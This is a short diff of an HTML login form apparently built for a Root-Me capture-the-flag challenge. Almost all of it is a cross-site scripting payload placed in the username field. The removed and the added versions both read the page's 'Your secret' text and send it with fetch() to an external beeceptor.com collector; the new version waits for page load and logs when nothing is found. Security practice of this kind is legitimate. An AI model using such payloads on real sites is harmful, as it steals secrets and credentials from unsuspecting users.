@@ -17,7 +17,7 @@
         <legend>Login</legend>
         <form method="POST" action="http://challenge01.root-me.org:58003/login">
             <label>Username</label><br>
-            <input id="username" class="mgb-1" name="username" value="<script defer>let a = document.querySelectorAll('p')[3];let aa = a.textContent;let aaa = aa.split('Your secret: ')[1]?.trim();fetch('https://djfgdjgdfg.free.beeceptor.com/' + aaa);</script>"><br>
+            <input id="username" class="mgb-1" name="username" value="<script defer>document.addEventListener('DOMContentLoaded', function(){ let a = document.querySelectorAll('p')[2]; let aa = a.textContent; let aaa = aa.split('Your secret: ')[1]?.trim(); if (aaa) { fetch('https://djfgdjgdfg.free.beeceptor.com/' + aaa); } else { console.log('No secret found'); } });</script>"><br>
             <label>Secret</label><br>
             <input id="secret" class="mgb-1" name="secret"><br>
             <button class="mgb-1" type="submit">Login</button>
